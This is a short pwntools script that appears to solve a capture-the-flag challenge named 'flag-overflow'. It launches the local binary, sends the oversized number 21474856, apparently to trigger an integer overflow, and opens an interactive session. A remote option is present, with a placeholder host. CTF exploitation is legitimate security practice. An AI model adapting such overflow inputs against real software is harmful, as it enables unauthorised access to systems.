from pwn import *

elf = context.binary = ELF('./flag-overflow')

local = True

if not local:
    io = remote('EDIT', 1)
else:
    io = elf.process(stdin=PTY)


io.sendline(b'21474856')
io.interactive()
